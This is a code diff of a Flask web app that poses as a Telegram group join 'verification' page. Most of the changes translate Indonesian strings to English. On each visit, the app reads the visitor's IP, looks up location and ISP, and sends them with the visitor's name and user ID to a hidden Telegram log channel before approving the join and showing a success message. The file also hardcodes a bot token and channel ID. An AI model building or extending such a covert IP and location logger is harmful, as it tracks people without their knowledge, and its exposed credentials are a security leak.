@@ -3,6 +3,7 @@ import requests
 import os
 from datetime import datetime
 
+# === YOUR DATA (UPDATED) ===
 BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
 LOG_CHANNEL = "-1002290475903"
 
@@ -15,7 +16,7 @@ def verify():
     name = request.args.get('name', 'User')
 
     if not chat_id or not user_id:
-        return "Link tidak valid.", 400
+        return "Invalid link.", 400
 
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
@@ -32,18 +33,26 @@ def verify():
     log_text = f"""
 🔥 NEW MEMBER DETECTED
 
-👤 Nama: {name}
+👤 Name: {name}
 🆔 User ID: <code>{user_id}</code>
 🌐 IP: <code>{ip}</code>
-📍 Lokasi: {location}
+📍 Location: {location}
 🏢 ISP: {geo.get('isp', 'Unknown')}
-⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
     """
 
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"})
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest", json={"chat_id": chat_id, "user_id": user_id})
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                  json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"})
 
-    return "<h2 style='text-align:center; margin-top:100px; color:green;'>✅ Verifikasi Berhasil!<br><br>Kamu sudah di-approve ke grup.</h2>", 200
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
+                  json={"chat_id": chat_id, "user_id": user_id})
+
+    return """
+    <h2 style="text-align:center; margin-top:100px; color:green;">
+        ✅ Verification Successful!<br><br>
+        You have been approved to the group.
+    </h2>
+    """, 200
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8080))
